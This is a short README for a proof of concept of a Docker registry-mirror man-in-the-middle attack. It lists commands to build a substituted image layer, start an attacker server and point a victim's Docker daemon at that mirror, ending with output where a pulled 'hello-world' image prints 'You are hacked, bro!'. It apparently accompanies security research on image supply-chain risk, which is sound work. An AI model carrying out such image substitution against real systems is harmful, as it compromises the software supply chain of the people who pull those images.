PoC of docker registry-mirror MITM attack
===


# Server(Attacker)

# 1. build diffid.go calculator

```sh
cd diffid && go build diffid.go
```

# 2. build layer.tar.gz

```sh
gcc -static hello.c -o hello
tar -czvf layer.tar.gz hello
```


# 3. start server

```sh
./server.py
```

# Client(Victim)

Config docker to user attacker's registry mirror:

```sh
sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json <<EOF
{
    "registry-mirrors": [
        "http://localhost:5000"
    ]
}
EOF

# restart docker daemon
sudo systemctl daemon-reload
sudo systemctl restart docker
```

and then docker pull or run to see the MITM result:
```sh
$ docker run --rm hello-world
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
cf02c551b988: Pull complete
Digest: sha256:6eb1bf5e044ede4cad2267ce2d15d306c5f6e6351e790ac36c7d99ce1418b7e2
Status: Downloaded newer image for hello-world:latest
You are hacked, bro!
```

For more details, see [Dockerhub 镜像供应链攻击风险研究](https://evilpan.com/2025/11/30/docker-mirror-attack/).
